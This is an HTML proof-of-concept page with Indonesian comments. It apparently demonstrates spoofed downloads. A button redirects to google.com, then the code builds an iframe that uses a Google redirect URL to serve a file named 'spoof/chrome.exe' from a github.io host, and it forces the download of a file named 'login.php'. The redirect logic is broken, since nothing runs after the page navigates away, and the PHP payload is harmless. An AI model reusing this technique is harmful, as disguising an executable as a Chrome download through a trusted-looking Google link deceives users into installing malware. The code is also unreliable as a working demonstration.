<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PoC with Iframe and Button</title>
</head>
<body>
  <div id="content">
    <h1>Step 2: Redirect to Google</h1>
    <p>Klik tombol di bawah untuk mengunjungi <b>Google.com</b> dan menampilkan iframe dengan URL yang ditentukan:</p>

    <!-- Button untuk ke Google -->
    <button onclick="redirectToGoogle()">Go to Google.com</button>
  </div>

  <script>
    function redirectToGoogle() {
      // Redirect ke Google.com di tab yang sama
      window.location.href = "https://www.google.com";

      // Tunggu beberapa detik agar halaman benar-benar di-load, baru tampilkan iframe dan download
      setTimeout(function() {
        // Iframe baru akan ditampilkan setelah beberapa detik
        const iframe = document.createElement("iframe");
        iframe.src = "https://www.google.com/url?q=https%3A%2F%2Fcnfdnfial-ops.github.io%2Fspoof%2Fchrome.exe&sa=D&sntz=1&usg=AOvVaw3W5r-6mMJTcMqxax4geLnL";
        iframe.width = "600";
        iframe.height = "300";
        iframe.style.border = "1px solid #ccc";
        document.body.appendChild(iframe);  // Menambahkan iframe ke body
        
        // Simulasi dialog download setelah iframe dimunculkan
        triggerDownload();
      }, 2000);  // Delay 2 detik setelah redirect untuk memastikan halaman di-load
    }

    function triggerDownload() {
      // Buat file PHP yang akan didownload
      const php = `<?php
echo "wkwkwk ini file php bebas ðŸ˜";
?>`;

      const blob = new Blob([php], { type: "application/php" });
      const a = document.createElement("a");
      a.href = URL.createObjectURL(blob);
      a.download = "login.php";
      a.click();  // Trigger download
    }
  </script>
</body>
</html>
